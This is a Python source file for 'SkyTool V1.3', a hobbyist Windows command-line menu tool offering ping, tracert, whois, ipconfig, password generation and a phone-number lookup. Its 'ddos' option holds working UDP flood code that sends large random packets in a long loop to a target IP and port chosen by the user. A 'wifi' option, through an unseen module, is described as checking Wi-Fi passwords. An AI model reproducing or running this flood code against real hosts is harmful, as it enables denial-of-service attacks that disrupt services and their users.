###############################################################################
#                                                                             #
#    				create by SkypeG                                          #
#   								                                          #     
#  				         SkyTool                                              #     
#                         V1.3                                                #
#                                                                             #
#  https://github.com/SkypeG                                                  #
#  https://www.youtube.com/@Skype112G/featured			                      #
###############################################################################

import requests
import json
import os
import sys
import socket
import random
import colorama
import time
import phonenumbers
import pycountry
import folium
import pyfiglet
import string
import secrets
import subprocess
import whois
import msvcrt

from colorama import Fore, Back, Style
from tqdm import tqdm
from pathlib import Path
from phonenumbers import geocoder, carrier
from phonenumbers.phonenumberutil import region_code_for_number
from opencage.geocoder import OpenCageGeocode

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

# Banner awal
ascii_banner = pyfiglet.figlet_format("Skytool >")
print(ascii_banner)

for _ in tqdm(range(100), desc="Loading...", ascii=False, ncols=75):
    time.sleep(0.02)

clear_terminal()

print ("###############################################################################")
print ("                                                                               ")
print ("    				create by SkypeG                                           ")
print ("    								                                           ")
print ("   				   SkyTool                                                     ")
print ("                                   V1.3                                        ")
print ("                                                                               ")
print ("  https://github.com/SkypeG                                                    ")
print ("  https://www.youtube.com/@Skype112G/featured			                       ")
print ("###############################################################################")
print ("Use 'help' To See The Command!")

host = socket.gethostname()

# Loop menu
while True:
    selection = input(f"{host}@Skytool :").lower().strip()

    if selection == "help":
        print("""
    credit             : About the creator/developer
    customascii        : Print Your Ascii Art Text
    myqueryip          : For Checking Your Query IP
    myip               : For Checking Your Computer IP
    ip                 : Check Data From An Ip Address
    ipconfig           : Show network configuration
    whoami             : Show current user (on progress)
    pwgen              : Generate Secure Password
    ddos               : DDoS Tool (on progress)
    wifi               : Check Wifi Password
    trackphonenumber   : Track phone number
    whois              : Whois domain info (on progress)
    ping               : Ping a website
    tracert            : Trace route to website
    cmd                : Run as a cmd
    ipconfig/all       : Displays TCP/IP configuration information for all network interfaces on your computer
              
    Note: - Commands are case-insensitive.
          - Type 'exit' to exit the program
        """)

    elif selection == "credit":
        print("Created by SkypeG")
        print("Github   : https://github.com/SkypeG")
        print("Youtube  : https://www.youtube.com/@Skype112G/featured")
        print("Discord  : riz.112")

    elif selection == "customascii":
        ascii_banner_custom = pyfiglet.figlet_format(input("Ascii :"))
        print(ascii_banner_custom)

    elif selection == "credits":
        print("""
        Create By Sky Inc.
        Programmed By Sky Inc.
        """)

    elif selection == "myip":
        print("Device Name :", host)
        ip = socket.gethostbyname(host)
        print("Ip :", ip)

    elif selection == "pwgen":
        alphabet = string.ascii_letters + string.digits
        password = ''.join(secrets.choice(alphabet) for i in range(16))
        print("The Password Is :" + password)

    elif selection == "ddos":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = input("Enter Target IP: ")
        port = int(input("Enter Target Port: "))
        sleep = float(input("Sleep: "))

        s.connect((ip, port))
        for i in range(1, 100**3):  # dibatasi supaya tidak crash
            s.send(random._urandom(10)*1000)
            print(f"Send: {i}", end='\r')
            time.sleep(sleep)

    elif selection == "ip":
        import IPGEO

    elif selection == "trackphonenumber":
        number = input("Enter Phone Number: ")
        pn = phonenumbers.parse(number)

        country = pycountry.countries.get(alpha_2=region_code_for_number(pn))
        location = country.name if country else "Unknown"
        print("Country:", location)

        print("Carrier:", carrier.name_for_number(pn, "en"))

        key = input("Enter Your Opencage API KEY: ")
        geocoder = OpenCageGeocode(key)
        results = geocoder.geocode(location)
        if results:
            lat = results[0]['geometry']['lat']
            lng = results[0]['geometry']['lng']
            print("Latitude:", lat)
            print("Longitude:", lng)

            myMap = folium.Map(location=[lat, lng], zoom_start=9)
            folium.Marker([lat, lng], popup=location).add_to(myMap)
            myMap.save("mylocation.html")
            os.system("mylocation.html")

    elif selection == "wifi":
        import wifi

    elif selection == "myqueryip":
        import query

    elif selection == "ipconfig":
        ipconfig = subprocess.run('ipconfig', capture_output=True, text=True)
        print(ipconfig.stdout)

    elif selection == "whoami":
        whoami = subprocess.run('whoami', capture_output=True, text=True)
        whoamiusername = whoami.stdout.strip()
        print(f"Username: {whoamiusername}")

    elif selection == "whois":
        domain_name = input("Input The Link/Domain Web :")
        whois_info = whois.whois(domain_name)

        print(f"Domain name: {whois_info.domain_name}")
        print(f"Registrar: {whois_info.registrar}")
        print(f"Registration date: {whois_info.creation_date}")
        print(f"Expiration date: {whois_info.expiration_date}")
        print(f"Last updated: {whois_info.updated_date}")
        print(f"Name servers: {whois_info.name_servers}")

    elif selection == "ping":
        ping_hostname = input("Input Web URL :")
        ping_result = subprocess.run(['ping', '-n', '4', ping_hostname], capture_output=True, text=True)
        print(ping_result.stdout)

    elif selection == "tracert":
        tracert_hostname = input("Input The Web URL :")
        tracert_result = subprocess.run(['tracert', '-d', tracert_hostname], capture_output=True, text=True)
        print(tracert_result.stdout)

    elif selection in ["exit", "quit"]:
        print("[System] Press any key to continue .....")
        msvcrt.getch()

        print("[System] Exiting SkyTool...")
        time.sleep(1)
        break
    
    elif selection == "cmd":
        cmd = input("Command : ")
        if cmd.lower() in ["exit", "quit"]:
            break
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.stdout:
                print(result.stdout)
            if result.stderr:
                print("Error:", result.stderr)
        except Exception as e:
            print("Failed to execute the command : ", e)
    
    elif selection == "ipconfig/all":
        subprocess.run("ipconfig/all", shell=True)


    else:
        print("[System] Sorry Command Not Found!")
